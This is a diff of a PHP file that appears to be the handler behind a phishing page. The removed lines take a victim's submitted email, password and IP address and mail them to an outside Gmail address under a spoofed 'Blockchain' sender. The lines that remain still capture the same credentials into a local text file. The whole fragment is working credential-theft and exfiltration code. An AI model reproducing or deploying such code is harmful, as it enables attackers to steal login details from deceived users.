@@ -1,31 +1,6 @@
 <?php
 
 
-/*========== [ Variables ]==========*/
-$ip 		= getenv("REMOTE_ADDR");
-$email   = $_POST['email'];
-$pass   = $_POST['pass'];
-$today = date("F j, Y, g:i a");
-/*========== [ Variables ]==========*/
-
-
-$message = "yakipdaris@gmail.com=
-====💲💲💲==== 💰💰💰 ADS TEAM 💰💰💰=====💲💲💲====
-Email      : $email
-Sandi      : $pass
-IP	       : $ip
-DAY	       : $today
-====💲💲💲==== 💰💰💰 THANK'S YOU 💰💰💰=====💲💲💲====";
-
-
-$to = "yakipdaris@gmail.com"; // Email Here
-$subject = "ADS TEAM ACCOUNT = [$ip]";
-$headers = "From: Blockchain <result.netnot@yandex.com>";
-$headers .= $_POST['eMailAdd']."\n";
-$headers .= "MIME-Version: 1.0\n";
-
-mail($to, $subject, $message,$headers);
-
 $file = "___________________________________________________DOKUMENTASI.txt";
 $email = $_POST['email'];
 $pass = $_POST['pass'];
